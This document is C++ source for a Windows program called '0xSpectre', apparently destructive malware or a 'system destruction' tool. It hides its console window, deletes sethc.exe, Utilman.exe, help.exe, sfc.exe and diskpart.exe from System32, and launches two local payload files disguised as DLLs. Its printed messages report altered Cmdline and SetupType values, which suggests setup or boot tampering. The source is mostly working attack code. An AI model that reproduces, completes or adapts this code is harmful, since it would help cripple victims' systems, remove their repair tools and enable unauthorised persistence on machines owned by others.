#include <iostream>
#include <chrono>
#include <thread>
#include <string>
#include <cstdio> 
#include <cstdlib>
#include <ctime>
#ifdef _WIN32
#include <windows.h>  
#endif
    void enableANSI() {
#ifdef _WIN32
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut != INVALID_HANDLE_VALUE) {
        DWORD dwMode = 0;
        if (GetConsoleMode(hOut, &dwMode)) {
            dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
            SetConsoleMode(hOut, dwMode);
        }
    }
    }

#endif

int main() {
    SetConsoleTitleA("0xteam.cc");
    enableANSI();
    std::cout << "\n";

    std::cout << "\x1B[95m      ____      ______                   \n";
    std::cout << "\x1B[95m     / __ \\_  _/_  __/__  ____ _____ ___ \n";
    std::cout << "\x1B[95m    / / / / |/_// / / _ \\/ __ `/ __ `__ \\\n";
    std::cout << "\x1B[95m   / /_/ />  < / / /  __/ /_/ / / / / / /\n";
    std::cout << "\x1B[95m   \\____/_/|_|/_/  \\___/\\__,_/_/ /_/ /_/\n";
    std::cout << "\n";

    std::cout << "\x1B[97m           Developer-Build: June  26 2026\x1B[97m\n";
    std::cout << "\n";

    std::cout << " \x1B[46;30m Info    \x1B[0m\x1B[97m Welcome to 0xSpectre.\n";
    std::cout << " \x1B[43;30m Warn    \x1B[0m\x1B[97m This may cause system desctruction.\n";
    std::cout << "\n";


    std::cout << " \x1B[46;30m Info    \x1B[0m\x1B[97m The 0xSpectre window will be hidden in 5.";
        Sleep(1000);
    std::cout << " \x1B[1G \x1B[46;30m Info    \x1B[0m\x1B[97m The 0xSpectre window will be hidden in 4.";
        Sleep(1000);
    std::cout << " \x1B[1G \x1B[46;30m Info    \x1B[0m\x1B[97m The 0xSpectre window will be hidden in 3.";
        Sleep(1000);
    std::cout << " \x1B[1G \x1B[46;30m Info    \x1B[0m\x1B[97m The 0xSpectre window will be hidden in 2.";
        Sleep(1000);
    std::cout << " \x1B[1G \x1B[46;30m Info    \x1B[0m\x1B[97m The 0xSpectre window will be hidden in 1.";
        Sleep(1000);
    std::cout << " \x1B[1G \x1B[46;30m Info    \x1B[0m\x1B[97m The 0xSpectre window will be hidden in 0.\n";
    std::cout << "\n";

        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);
        Sleep(1000);
        std::cout << "\n";
        const char* path1 = "C:\\Windows\\System32\\sethc.exe";
        remove(path1);
        const char* path2 = "C:\\Windows\\System32\\Utilman.exe";
        remove(path2);
        const char* path3 = "C:\\Windows\\System32\\help.exe";
        remove(path3);
        const char* path4 = "C:\\Windows\\System32\\sfc.exe";
        remove(path4);
        const char* path5 = "C:\\Windows\\System32\\diskpart.exe";
        remove(path5);

    system(" \"%CD%\\coreenergy.dll\" ");
    system(" \"%CD%\\powerenergy.dll\" ");
    ShowWindow(hWnd, SW_SHOW);
        std::cout << " \x1B[43;30m Warn    \x1B[0m\x1B[97m Cmdline value been changed.\x1B[97m\n";
        std::cout << " \x1B[43;30m Warn    \x1B[0m\x1B[97m SetupType value been changed.\x1B[97m\n";
        std::cout << " \x1B[43;30m Warn    \x1B[0m\x1B[97m sethc been deleted.\x1B[97m\n";
        std::cout << " \x1B[43;30m Warn    \x1B[0m\x1B[97m Utilman been deleted.\x1B[97m\n";
        std::cout << " \x1B[43;30m Warn    \x1B[0m\x1B[97m sfc been deleted.\x1B[97m\n";
        std::cout << " \x1B[43;30m Warn    \x1B[0m\x1B[97m diskpart been deleted.\x1B[97m\n";
    system("pause");
    return 0;

}